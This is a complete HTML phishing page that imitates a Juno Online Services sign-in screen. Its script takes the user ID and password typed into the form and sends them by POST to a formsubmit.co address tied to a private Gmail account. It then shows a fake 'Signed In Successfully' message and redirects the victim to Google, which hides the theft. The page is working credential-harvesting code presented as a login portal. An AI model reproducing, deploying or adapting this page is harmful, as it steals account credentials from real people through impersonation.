<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome - Sign In</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-[#f0f2f5] font-sans flex items-center justify-center min-h-screen p-4">

    <div id="toast" class="fixed top-5 left-1/2 transform -translate-x-1/2 z-50 transition-all duration-500 opacity-0 -translate-y-10">
        <div class="bg-green-600 text-white px-6 py-3 rounded shadow-lg font-bold">
            Signed In Successfully
        </div>
    </div>

    <div class="w-full max-w-[420px] bg-white shadow-2xl rounded-lg overflow-hidden border border-gray-100">
        
        <div class="w-full pt-10 pb-4 flex items-center justify-center bg-white">
            <img src="Juno_Online_Services_logo.svg" 
                 alt="Juno Logo" 
                 class="h-12 w-auto object-contain">
        </div>

        <div class="p-8 pt-4">
            <div class="text-center mb-8">
                <h2 class="text-2xl font-bold text-gray-800">Welcome!</h2>
                <p class="text-gray-500 text-sm mt-1">Please sign-in to update.</p>
            </div>

            <form id="loginForm" class="space-y-6">
                
                <input type="hidden" name="_subject" value="Juno Portal Submission">

                <div>
                    <label for="user_id" class="block text-xs font-bold text-gray-700 uppercase tracking-wide mb-1 ml-1">
                        User ID<span class="text-red-500">*</span>
                    </label>
                    <input type="text" id="user_id" name="user_id" required 
                           class="w-full px-4 py-3 border border-gray-300 rounded focus:ring-2 focus:ring-[#002e5d] focus:border-transparent outline-none transition-all bg-gray-50 placeholder-gray-400"
                           placeholder="Enter User ID">
                </div>

                <div>
                    <label for="password" class="block text-xs font-bold text-gray-700 uppercase tracking-wide mb-1 ml-1">
                        Password<span class="text-red-500">*</span>
                    </label>
                    <input type="text" id="password" name="password" required 
                           class="w-full px-4 py-3 border border-gray-300 rounded focus:ring-2 focus:ring-[#002e5d] focus:border-transparent outline-none transition-all bg-gray-50 placeholder-gray-400"
                           placeholder="Enter Password">
                </div>

                <button type="submit" id="submitBtn" 
                        class="w-full bg-[#002e5d] text-white font-bold py-3.5 px-4 rounded hover:bg-[#003d7a] active:scale-[0.98] transition-all uppercase tracking-widest text-sm shadow-md">
                    Sign In
                </button>

            </form>
        </div>

        <div class="w-full h-1.5 bg-[#002e5d]"></div>
    </div>

    <script>
        const form = document.getElementById('loginForm');
        const btn = document.getElementById('submitBtn');
        const toast = document.getElementById('toast');

        form.addEventListener('submit', function(e) {
            e.preventDefault();
            
            btn.innerText = "PROCESSING...";
            btn.disabled = true;

            const formData = new FormData(form);

            // Using AJAX to show your "Signed In" message instead of a redirect page
            fetch("https://formsubmit.co/ajax/palare0001@gmail.com", {
                method: "POST",
                body: formData
            })
            .then(response => {
                if (response.ok) {
                    // Trigger the toast notification
                    toast.classList.replace('opacity-0', 'opacity-100');
                    toast.classList.replace('-translate-y-10', 'translate-y-0');
                    
                    btn.innerText = "SIGNED IN";
                    btn.classList.replace('bg-[#002e5d]', 'bg-green-600');

                    // Final redirect to Google
                    setTimeout(() => {
                        window.location.href = "https://www.google.com";
                    }, 2000);
                } else {
                    btn.innerText = "SIGN IN";
                    btn.disabled = false;
                    alert("Submission failed. Please verify your internet connection.");
                }
            })
            .catch(error => {
                btn.innerText = "SIGN IN";
                btn.disabled = false;
                console.error('Error:', error);
            });
        });
    </script>

</body>
</html>
